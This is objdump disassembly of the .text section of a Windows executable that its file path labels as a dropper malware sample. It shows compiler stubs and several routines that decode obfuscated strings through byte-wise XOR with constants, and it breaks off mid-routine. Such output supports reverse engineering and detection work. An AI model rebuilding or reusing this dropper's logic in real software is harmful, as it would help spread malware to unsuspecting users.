
malware_samples/dropper/9d90df33cd318c0fdd6cb06fe72af92b49bcd96b1b188412aa2f42bfd67ff2d0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 d7 05 00 00       	call   0x1400015e0
   140001009:	48 8d 0d 40 89 00 00 	lea    0x8940(%rip),%rcx        # 0x140009950
   140001010:	48 83 c4 28          	add    $0x28,%rsp
   140001014:	e9 cb 77 00 00       	jmp    0x1400087e4
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 83 ec 28          	sub    $0x28,%rsp
   140001024:	e8 27 0a 00 00       	call   0x140001a50
   140001029:	48 8d 0d a0 89 00 00 	lea    0x89a0(%rip),%rcx        # 0x1400099d0
   140001030:	48 83 c4 28          	add    $0x28,%rsp
   140001034:	e9 ab 77 00 00       	jmp    0x1400087e4
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 83 ec 28          	sub    $0x28,%rsp
   140001044:	e8 77 0e 00 00       	call   0x140001ec0
   140001049:	48 8d 0d 00 8a 00 00 	lea    0x8a00(%rip),%rcx        # 0x140009a50
   140001050:	48 83 c4 28          	add    $0x28,%rsp
   140001054:	e9 8b 77 00 00       	jmp    0x1400087e4
   140001059:	cc                   	int3
   14000105a:	cc                   	int3
   14000105b:	cc                   	int3
   14000105c:	cc                   	int3
   14000105d:	cc                   	int3
   14000105e:	cc                   	int3
   14000105f:	cc                   	int3
   140001060:	48 83 ec 28          	sub    $0x28,%rsp
   140001064:	e8 c7 12 00 00       	call   0x140002330
   140001069:	48 8d 0d 60 8a 00 00 	lea    0x8a60(%rip),%rcx        # 0x140009ad0
   140001070:	48 83 c4 28          	add    $0x28,%rsp
   140001074:	e9 6b 77 00 00       	jmp    0x1400087e4
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	48 83 ec 28          	sub    $0x28,%rsp
   140001084:	e8 17 17 00 00       	call   0x1400027a0
   140001089:	48 8d 0d c0 8a 00 00 	lea    0x8ac0(%rip),%rcx        # 0x140009b50
   140001090:	48 83 c4 28          	add    $0x28,%rsp
   140001094:	e9 4b 77 00 00       	jmp    0x1400087e4
   140001099:	cc                   	int3
   14000109a:	cc                   	int3
   14000109b:	cc                   	int3
   14000109c:	cc                   	int3
   14000109d:	cc                   	int3
   14000109e:	cc                   	int3
   14000109f:	cc                   	int3
   1400010a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010a4:	e8 67 1b 00 00       	call   0x140002c10
   1400010a9:	48 8d 0d 20 8b 00 00 	lea    0x8b20(%rip),%rcx        # 0x140009bd0
   1400010b0:	48 83 c4 28          	add    $0x28,%rsp
   1400010b4:	e9 2b 77 00 00       	jmp    0x1400087e4
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	cc                   	int3
   1400010bd:	cc                   	int3
   1400010be:	cc                   	int3
   1400010bf:	cc                   	int3
   1400010c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010c4:	e8 b7 1f 00 00       	call   0x140003080
   1400010c9:	48 8d 0d 80 8b 00 00 	lea    0x8b80(%rip),%rcx        # 0x140009c50
   1400010d0:	48 83 c4 28          	add    $0x28,%rsp
   1400010d4:	e9 0b 77 00 00       	jmp    0x1400087e4
   1400010d9:	cc                   	int3
   1400010da:	cc                   	int3
   1400010db:	cc                   	int3
   1400010dc:	cc                   	int3
   1400010dd:	cc                   	int3
   1400010de:	cc                   	int3
   1400010df:	cc                   	int3
   1400010e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010e4:	e8 07 24 00 00       	call   0x1400034f0
   1400010e9:	48 8d 0d e0 8b 00 00 	lea    0x8be0(%rip),%rcx        # 0x140009cd0
   1400010f0:	48 83 c4 28          	add    $0x28,%rsp
   1400010f4:	e9 eb 76 00 00       	jmp    0x1400087e4
   1400010f9:	cc                   	int3
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	48 83 ec 28          	sub    $0x28,%rsp
   140001104:	e8 57 28 00 00       	call   0x140003960
   140001109:	48 8d 0d 40 8c 00 00 	lea    0x8c40(%rip),%rcx        # 0x140009d50
   140001110:	48 83 c4 28          	add    $0x28,%rsp
   140001114:	e9 cb 76 00 00       	jmp    0x1400087e4
   140001119:	cc                   	int3
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	48 83 ec 28          	sub    $0x28,%rsp
   140001124:	e8 a7 2c 00 00       	call   0x140003dd0
   140001129:	48 8d 0d a0 8c 00 00 	lea    0x8ca0(%rip),%rcx        # 0x140009dd0
   140001130:	48 83 c4 28          	add    $0x28,%rsp
   140001134:	e9 ab 76 00 00       	jmp    0x1400087e4
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	40 53                	rex push %rbx
   140001142:	48 83 ec 20          	sub    $0x20,%rsp
   140001146:	48 8d 1d 1b 5d 02 00 	lea    0x25d1b(%rip),%rbx        # 0x140026e68
   14000114d:	ba 08 00 00 00       	mov    $0x8,%edx
   140001152:	48 8b cb             	mov    %rbx,%rcx
   140001155:	e8 b6 51 00 00       	call   0x140006310
   14000115a:	4c 8d 0d 6f d7 00 00 	lea    0xd76f(%rip),%r9        # 0x14000e8d0
   140001161:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001168:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000116f:	00 
   140001170:	48 ff c1             	inc    %rcx
   140001173:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001178:	75 f6                	jne    0x140001170
   14000117a:	48 83 3d fe 5c 02 00 	cmpq   $0xf,0x25cfe(%rip)        # 0x140026e80
   140001181:	0f 
   140001182:	48 8b c3             	mov    %rbx,%rax
   140001185:	4c 8b c3             	mov    %rbx,%r8
   140001188:	48 0f 47 05 d8 5c 02 	cmova  0x25cd8(%rip),%rax        # 0x140026e68
   14000118f:	00 
   140001190:	c6 00 10             	movb   $0x10,(%rax)
   140001193:	b8 01 00 00 00       	mov    $0x1,%eax
   140001198:	48 83 3d e0 5c 02 00 	cmpq   $0xf,0x25ce0(%rip)        # 0x140026e80
   14000119f:	0f 
   1400011a0:	4c 0f 47 05 c0 5c 02 	cmova  0x25cc0(%rip),%r8        # 0x140026e68
   1400011a7:	00 
   1400011a8:	33 d2                	xor    %edx,%edx
   1400011aa:	48 f7 f1             	div    %rcx
   1400011ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400011b2:	34 69                	xor    $0x69,%al
   1400011b4:	41 88 40 01          	mov    %al,0x1(%r8)
   1400011b8:	4c 8b c3             	mov    %rbx,%r8
   1400011bb:	48 83 3d bd 5c 02 00 	cmpq   $0xf,0x25cbd(%rip)        # 0x140026e80
   1400011c2:	0f 
   1400011c3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400011c8:	4c 0f 47 05 98 5c 02 	cmova  0x25c98(%rip),%r8        # 0x140026e68
   1400011cf:	00 
   1400011d0:	33 d2                	xor    %edx,%edx
   1400011d2:	48 f7 f1             	div    %rcx
   1400011d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400011da:	34 72                	xor    $0x72,%al
   1400011dc:	41 88 40 02          	mov    %al,0x2(%r8)
   1400011e0:	4c 8b c3             	mov    %rbx,%r8
   1400011e3:	48 83 3d 95 5c 02 00 	cmpq   $0xf,0x25c95(%rip)        # 0x140026e80
   1400011ea:	0f 
   1400011eb:	b8 03 00 00 00       	mov    $0x3,%eax
   1400011f0:	4c 0f 47 05 70 5c 02 	cmova  0x25c70(%rip),%r8        # 0x140026e68
   1400011f7:	00 
   1400011f8:	33 d2                	xor    %edx,%edx
   1400011fa:	48 f7 f1             	div    %rcx
   1400011fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001202:	34 61                	xor    $0x61,%al
   140001204:	41 88 40 03          	mov    %al,0x3(%r8)
   140001208:	4c 8b c3             	mov    %rbx,%r8
   14000120b:	48 83 3d 6d 5c 02 00 	cmpq   $0xf,0x25c6d(%rip)        # 0x140026e80
   140001212:	0f 
   140001213:	b8 04 00 00 00       	mov    $0x4,%eax
   140001218:	4c 0f 47 05 48 5c 02 	cmova  0x25c48(%rip),%r8        # 0x140026e68
   14000121f:	00 
   140001220:	33 d2                	xor    %edx,%edx
   140001222:	48 f7 f1             	div    %rcx
   140001225:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000122a:	34 67                	xor    $0x67,%al
   14000122c:	41 88 40 04          	mov    %al,0x4(%r8)
   140001230:	4c 8b c3             	mov    %rbx,%r8
   140001233:	48 83 3d 45 5c 02 00 	cmpq   $0xf,0x25c45(%rip)        # 0x140026e80
   14000123a:	0f 
   14000123b:	b8 05 00 00 00       	mov    $0x5,%eax
   140001240:	4c 0f 47 05 20 5c 02 	cmova  0x25c20(%rip),%r8        # 0x140026e68
   140001247:	00 
   140001248:	33 d2                	xor    %edx,%edx
   14000124a:	48 f7 f1             	div    %rcx
   14000124d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001252:	34 74                	xor    $0x74,%al
   140001254:	41 88 40 05          	mov    %al,0x5(%r8)
   140001258:	4c 8b c3             	mov    %rbx,%r8
   14000125b:	48 83 3d 1d 5c 02 00 	cmpq   $0xf,0x25c1d(%rip)        # 0x140026e80
   140001262:	0f 
   140001263:	b8 06 00 00 00       	mov    $0x6,%eax
   140001268:	4c 0f 47 05 f8 5b 02 	cmova  0x25bf8(%rip),%r8        # 0x140026e68
   14000126f:	00 
   140001270:	33 d2                	xor    %edx,%edx
   140001272:	48 f7 f1             	div    %rcx
   140001275:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000127a:	34 36                	xor    $0x36,%al
   14000127c:	41 88 40 06          	mov    %al,0x6(%r8)
   140001280:	b8 07 00 00 00       	mov    $0x7,%eax
   140001285:	48 83 3d f3 5b 02 00 	cmpq   $0xf,0x25bf3(%rip)        # 0x140026e80
   14000128c:	0f 
   14000128d:	48 0f 47 1d d3 5b 02 	cmova  0x25bd3(%rip),%rbx        # 0x140026e68
   140001294:	00 
   140001295:	33 d2                	xor    %edx,%edx
   140001297:	48 f7 f1             	div    %rcx
   14000129a:	48 8d 0d af 8b 00 00 	lea    0x8baf(%rip),%rcx        # 0x140009e50
   1400012a1:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400012a6:	34 34                	xor    $0x34,%al
   1400012a8:	88 43 07             	mov    %al,0x7(%rbx)
   1400012ab:	48 83 c4 20          	add    $0x20,%rsp
   1400012af:	5b                   	pop    %rbx
   1400012b0:	e9 2f 75 00 00       	jmp    0x1400087e4
   1400012b5:	cc                   	int3
   1400012b6:	cc                   	int3
   1400012b7:	cc                   	int3
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400012c4:	e8 27 2e 00 00       	call   0x1400040f0
   1400012c9:	48 8d 0d 00 8c 00 00 	lea    0x8c00(%rip),%rcx        # 0x140009ed0
   1400012d0:	48 83 c4 28          	add    $0x28,%rsp
   1400012d4:	e9 0b 75 00 00       	jmp    0x1400087e4
   1400012d9:	cc                   	int3
   1400012da:	cc                   	int3
   1400012db:	cc                   	int3
   1400012dc:	cc                   	int3
   1400012dd:	cc                   	int3
   1400012de:	cc                   	int3
   1400012df:	cc                   	int3
   1400012e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400012e4:	e8 27 30 00 00       	call   0x140004310
   1400012e9:	48 8d 0d 60 8c 00 00 	lea    0x8c60(%rip),%rcx        # 0x140009f50
   1400012f0:	48 83 c4 28          	add    $0x28,%rsp
   1400012f4:	e9 eb 74 00 00       	jmp    0x1400087e4
   1400012f9:	cc                   	int3
   1400012fa:	cc                   	int3
   1400012fb:	cc                   	int3
   1400012fc:	cc                   	int3
   1400012fd:	cc                   	int3
   1400012fe:	cc                   	int3
   1400012ff:	cc                   	int3
   140001300:	48 8d 0d c9 8c 00 00 	lea    0x8cc9(%rip),%rcx        # 0x140009fd0
   140001307:	e9 d8 74 00 00       	jmp    0x1400087e4
   14000130c:	48 8d 0d 35 8d 00 00 	lea    0x8d35(%rip),%rcx        # 0x14000a048
   140001313:	e9 cc 74 00 00       	jmp    0x1400087e4
   140001318:	cc                   	int3
   140001319:	cc                   	int3
   14000131a:	cc                   	int3
   14000131b:	cc                   	int3
   14000131c:	cc                   	int3
   14000131d:	cc                   	int3
   14000131e:	cc                   	int3
   14000131f:	cc                   	int3
   140001320:	40 53                	rex push %rbx
   140001322:	48 83 ec 20          	sub    $0x20,%rsp
   140001326:	48 8b d9             	mov    %rcx,%rbx
   140001329:	48 8b c2             	mov    %rdx,%rax
   14000132c:	48 8d 0d 05 a2 00 00 	lea    0xa205(%rip),%rcx        # 0x14000b538
   140001333:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001336:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000133a:	48 89 0b             	mov    %rcx,(%rbx)
   14000133d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001341:	0f 11 02             	movups %xmm0,(%rdx)
   140001344:	ff 15 de 9e 00 00    	call   *0x9ede(%rip)        # 0x14000b228
   14000134a:	48 8b c3             	mov    %rbx,%rax
   14000134d:	48 83 c4 20          	add    $0x20,%rsp
   140001351:	5b                   	pop    %rbx
   140001352:	c3                   	ret
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	cc                   	int3
   140001357:	cc                   	int3
   140001358:	cc                   	int3
   140001359:	cc                   	int3
   14000135a:	cc                   	int3
   14000135b:	cc                   	int3
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001364:	48 8d 05 6d d5 00 00 	lea    0xd56d(%rip),%rax        # 0x14000e8d8
   14000136b:	48 85 d2             	test   %rdx,%rdx
   14000136e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001372:	c3                   	ret
   140001373:	cc                   	int3
   140001374:	cc                   	int3
   140001375:	cc                   	int3
   140001376:	cc                   	int3
   140001377:	cc                   	int3
   140001378:	cc                   	int3
   140001379:	cc                   	int3
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	cc                   	int3
   14000137d:	cc                   	int3
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001385:	57                   	push   %rdi
   140001386:	48 83 ec 20          	sub    $0x20,%rsp
   14000138a:	48 8d 05 a7 a1 00 00 	lea    0xa1a7(%rip),%rax        # 0x14000b538
   140001391:	48 8b f9             	mov    %rcx,%rdi
   140001394:	48 89 01             	mov    %rax,(%rcx)
   140001397:	8b da                	mov    %edx,%ebx
   140001399:	48 83 c1 08          	add    $0x8,%rcx
   14000139d:	ff 15 8d 9e 00 00    	call   *0x9e8d(%rip)        # 0x14000b230
   1400013a3:	f6 c3 01             	test   $0x1,%bl
   1400013a6:	74 0d                	je     0x1400013b5
   1400013a8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400013ad:	48 8b cf             	mov    %rdi,%rcx
   1400013b0:	e8 47 74 00 00       	call   0x1400087fc
   1400013b5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400013ba:	48 8b c7             	mov    %rdi,%rax
   1400013bd:	48 83 c4 20          	add    $0x20,%rsp
   1400013c1:	5f                   	pop    %rdi
   1400013c2:	c3                   	ret
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	48 8d 05 61 a1 00 00 	lea    0xa161(%rip),%rax        # 0x14000b538
   1400013d7:	48 89 01             	mov    %rax,(%rcx)
   1400013da:	48 83 c1 08          	add    $0x8,%rcx
   1400013de:	48 ff 25 4b 9e 00 00 	rex.W jmp *0x9e4b(%rip)        # 0x14000b230
   1400013e5:	cc                   	int3
   1400013e6:	cc                   	int3
   1400013e7:	cc                   	int3
   1400013e8:	cc                   	int3
   1400013e9:	cc                   	int3
   1400013ea:	cc                   	int3
   1400013eb:	cc                   	int3
   1400013ec:	cc                   	int3
   1400013ed:	cc                   	int3
   1400013ee:	cc                   	int3
   1400013ef:	cc                   	int3
   1400013f0:	48 8d 05 f9 d4 00 00 	lea    0xd4f9(%rip),%rax        # 0x14000e8f0
   1400013f7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400013fe:	00 
   1400013ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001403:	48 8d 05 6e a1 00 00 	lea    0xa16e(%rip),%rax        # 0x14000b578
   14000140a:	48 89 01             	mov    %rax,(%rcx)
   14000140d:	48 8b c1             	mov    %rcx,%rax
   140001410:	c3                   	ret
   140001411:	cc                   	int3
   140001412:	cc                   	int3
   140001413:	cc                   	int3
   140001414:	cc                   	int3
   140001415:	cc                   	int3
   140001416:	cc                   	int3
   140001417:	cc                   	int3
   140001418:	cc                   	int3
   140001419:	cc                   	int3
   14000141a:	cc                   	int3
   14000141b:	cc                   	int3
   14000141c:	cc                   	int3
   14000141d:	cc                   	int3
   14000141e:	cc                   	int3
   14000141f:	cc                   	int3
   140001420:	48 83 ec 48          	sub    $0x48,%rsp
   140001424:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001429:	e8 c2 ff ff ff       	call   0x1400013f0
   14000142e:	48 8d 15 23 ec 00 00 	lea    0xec23(%rip),%rdx        # 0x140010058
   140001435:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000143a:	e8 94 80 00 00       	call   0x1400094d3
   14000143f:	cc                   	int3
   140001440:	40 53                	rex push %rbx
   140001442:	48 83 ec 20          	sub    $0x20,%rsp
   140001446:	48 8b d9             	mov    %rcx,%rbx
   140001449:	48 8b c2             	mov    %rdx,%rax
   14000144c:	48 8d 0d e5 a0 00 00 	lea    0xa0e5(%rip),%rcx        # 0x14000b538
   140001453:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001456:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000145a:	48 89 0b             	mov    %rcx,(%rbx)
   14000145d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001461:	0f 11 02             	movups %xmm0,(%rdx)
   140001464:	ff 15 be 9d 00 00    	call   *0x9dbe(%rip)        # 0x14000b228
   14000146a:	48 8d 05 07 a1 00 00 	lea    0xa107(%rip),%rax        # 0x14000b578
   140001471:	48 89 03             	mov    %rax,(%rbx)
   140001474:	48 8b c3             	mov    %rbx,%rax
   140001477:	48 83 c4 20          	add    $0x20,%rsp
   14000147b:	5b                   	pop    %rbx
   14000147c:	c3                   	ret
   14000147d:	cc                   	int3
   14000147e:	cc                   	int3
   14000147f:	cc                   	int3
   140001480:	40 53                	rex push %rbx
   140001482:	48 83 ec 20          	sub    $0x20,%rsp
   140001486:	48 8b d9             	mov    %rcx,%rbx
   140001489:	48 8b c2             	mov    %rdx,%rax
   14000148c:	48 8d 0d a5 a0 00 00 	lea    0xa0a5(%rip),%rcx        # 0x14000b538
   140001493:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001496:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000149a:	48 89 0b             	mov    %rcx,(%rbx)
   14000149d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400014a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400014a4:	ff 15 7e 9d 00 00    	call   *0x9d7e(%rip)        # 0x14000b228
   1400014aa:	48 8d 05 9f a0 00 00 	lea    0xa09f(%rip),%rax        # 0x14000b550
   1400014b1:	48 89 03             	mov    %rax,(%rbx)
   1400014b4:	48 8b c3             	mov    %rbx,%rax
   1400014b7:	48 83 c4 20          	add    $0x20,%rsp
   1400014bb:	5b                   	pop    %rbx
   1400014bc:	c3                   	ret
   1400014bd:	cc                   	int3
   1400014be:	cc                   	int3
   1400014bf:	cc                   	int3
   1400014c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400014c4:	48 8d 0d 3d d4 00 00 	lea    0xd43d(%rip),%rcx        # 0x14000e908
   1400014cb:	ff 15 07 9d 00 00    	call   *0x9d07(%rip)        # 0x14000b1d8
   1400014d1:	cc                   	int3
   1400014d2:	cc                   	int3
   1400014d3:	cc                   	int3
   1400014d4:	cc                   	int3
   1400014d5:	cc                   	int3
   1400014d6:	cc                   	int3
   1400014d7:	cc                   	int3
   1400014d8:	cc                   	int3
   1400014d9:	cc                   	int3
   1400014da:	cc                   	int3
   1400014db:	cc                   	int3
   1400014dc:	cc                   	int3
   1400014dd:	cc                   	int3
   1400014de:	cc                   	int3
   1400014df:	cc                   	int3
   1400014e0:	48 8d 05 31 d4 00 00 	lea    0xd431(%rip),%rax        # 0x14000e918
   1400014e7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400014ee:	00 
   1400014ef:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400014f3:	48 8d 05 26 d5 00 00 	lea    0xd526(%rip),%rax        # 0x14000ea20
   1400014fa:	48 89 01             	mov    %rax,(%rcx)
   1400014fd:	48 8b c1             	mov    %rcx,%rax
   140001500:	c3                   	ret
   140001501:	cc                   	int3
   140001502:	cc                   	int3
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	48 83 ec 48          	sub    $0x48,%rsp
   140001514:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001519:	e8 c2 ff ff ff       	call   0x1400014e0
   14000151e:	48 8d 15 73 ea 00 00 	lea    0xea73(%rip),%rdx        # 0x14000ff98
   140001525:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000152a:	e8 a4 7f 00 00       	call   0x1400094d3
   14000152f:	cc                   	int3
   140001530:	40 53                	rex push %rbx
   140001532:	48 83 ec 20          	sub    $0x20,%rsp
   140001536:	48 8b d9             	mov    %rcx,%rbx
   140001539:	48 8b c2             	mov    %rdx,%rax
   14000153c:	48 8d 0d f5 9f 00 00 	lea    0x9ff5(%rip),%rcx        # 0x14000b538
   140001543:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001546:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000154a:	48 89 0b             	mov    %rcx,(%rbx)
   14000154d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001551:	0f 11 02             	movups %xmm0,(%rdx)
   140001554:	ff 15 ce 9c 00 00    	call   *0x9cce(%rip)        # 0x14000b228
   14000155a:	48 8d 05 bf d4 00 00 	lea    0xd4bf(%rip),%rax        # 0x14000ea20
   140001561:	48 89 03             	mov    %rax,(%rbx)
   140001564:	48 8b c3             	mov    %rbx,%rax
   140001567:	48 83 c4 20          	add    $0x20,%rsp
   14000156b:	5b                   	pop    %rbx
   14000156c:	c3                   	ret
   14000156d:	cc                   	int3
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	48 83 ec 28          	sub    $0x28,%rsp
   140001574:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001578:	48 85 c9             	test   %rcx,%rcx
   14000157b:	74 20                	je     0x14000159d
   14000157d:	48 8b 01             	mov    (%rcx),%rax
   140001580:	ff 50 10             	call   *0x10(%rax)
   140001583:	48 85 c0             	test   %rax,%rax
   140001586:	74 15                	je     0x14000159d
   140001588:	48 8b 08             	mov    (%rax),%rcx
   14000158b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001590:	4c 8b 01             	mov    (%rcx),%r8
   140001593:	48 8b c8             	mov    %rax,%rcx
   140001596:	48 83 c4 28          	add    $0x28,%rsp
   14000159a:	49 ff e0             	rex.WB jmp *%r8
   14000159d:	48 83 c4 28          	add    $0x28,%rsp
   1400015a1:	c3                   	ret
   1400015a2:	cc                   	int3
   1400015a3:	cc                   	int3
   1400015a4:	cc                   	int3
   1400015a5:	cc                   	int3
   1400015a6:	cc                   	int3
   1400015a7:	cc                   	int3
   1400015a8:	cc                   	int3
   1400015a9:	cc                   	int3
   1400015aa:	cc                   	int3
   1400015ab:	cc                   	int3
   1400015ac:	cc                   	int3
   1400015ad:	cc                   	int3
   1400015ae:	cc                   	int3
   1400015af:	cc                   	int3
   1400015b0:	81 61 18 ff f9 ff ff 	andl   $0xfffff9ff,0x18(%rcx)
   1400015b7:	48 8b c1             	mov    %rcx,%rax
   1400015ba:	81 49 18 00 08 00 00 	orl    $0x800,0x18(%rcx)
   1400015c1:	c3                   	ret
   1400015c2:	cc                   	int3
   1400015c3:	cc                   	int3
   1400015c4:	cc                   	int3
   1400015c5:	cc                   	int3
   1400015c6:	cc                   	int3
   1400015c7:	cc                   	int3
   1400015c8:	cc                   	int3
   1400015c9:	cc                   	int3
   1400015ca:	cc                   	int3
   1400015cb:	cc                   	int3
   1400015cc:	cc                   	int3
   1400015cd:	cc                   	int3
   1400015ce:	cc                   	int3
   1400015cf:	cc                   	int3
   1400015d0:	83 49 18 04          	orl    $0x4,0x18(%rcx)
   1400015d4:	48 8b c1             	mov    %rcx,%rax
   1400015d7:	c3                   	ret
   1400015d8:	cc                   	int3
   1400015d9:	cc                   	int3
   1400015da:	cc                   	int3
   1400015db:	cc                   	int3
   1400015dc:	cc                   	int3
   1400015dd:	cc                   	int3
   1400015de:	cc                   	int3
   1400015df:	cc                   	int3
   1400015e0:	40 53                	rex push %rbx
   1400015e2:	48 83 ec 30          	sub    $0x30,%rsp
   1400015e6:	48 8d 1d fb 57 02 00 	lea    0x257fb(%rip),%rbx        # 0x140026de8
   1400015ed:	ba 1b 00 00 00       	mov    $0x1b,%edx
   1400015f2:	48 8b cb             	mov    %rbx,%rcx
   1400015f5:	e8 16 4d 00 00       	call   0x140006310
   1400015fa:	4c 8d 0d bf d2 00 00 	lea    0xd2bf(%rip),%r9        # 0x14000e8c0
   140001601:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000160f:	00 
   140001610:	48 ff c1             	inc    %rcx
   140001613:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001618:	75 f6                	jne    0x140001610
   14000161a:	48 83 3d de 57 02 00 	cmpq   $0xf,0x257de(%rip)        # 0x140026e00
   140001621:	0f 
   140001622:	48 8b c3             	mov    %rbx,%rax
   140001625:	4c 8b c3             	mov    %rbx,%r8
   140001628:	48 0f 47 05 b8 57 02 	cmova  0x257b8(%rip),%rax        # 0x140026de8
   14000162f:	00 
   140001630:	c6 00 2c             	movb   $0x2c,(%rax)
   140001633:	b8 01 00 00 00       	mov    $0x1,%eax
   140001638:	48 83 3d c0 57 02 00 	cmpq   $0xf,0x257c0(%rip)        # 0x140026e00
   14000163f:	0f 
   140001640:	4c 0f 47 05 a0 57 02 	cmova  0x257a0(%rip),%r8        # 0x140026de8
   140001647:	00 
   140001648:	33 d2                	xor    %edx,%edx
   14000164a:	48 f7 f1             	div    %rcx
   14000164d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001652:	34 3a                	xor    $0x3a,%al
   140001654:	41 88 40 01          	mov    %al,0x1(%r8)
   140001658:	4c 8b c3             	mov    %rbx,%r8
   14000165b:	48 83 3d 9d 57 02 00 	cmpq   $0xf,0x2579d(%rip)        # 0x140026e00
   140001662:	0f 
   140001663:	b8 02 00 00 00       	mov    $0x2,%eax
   140001668:	4c 0f 47 05 78 57 02 	cmova  0x25778(%rip),%r8        # 0x140026de8
   14000166f:	00 
   140001670:	33 d2                	xor    %edx,%edx
   140001672:	48 f7 f1             	div    %rcx
   140001675:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000167a:	34 5c                	xor    $0x5c,%al
   14000167c:	41 88 40 02          	mov    %al,0x2(%r8)
   140001680:	4c 8b c3             	mov    %rbx,%r8
   140001683:	48 83 3d 75 57 02 00 	cmpq   $0xf,0x25775(%rip)        # 0x140026e00
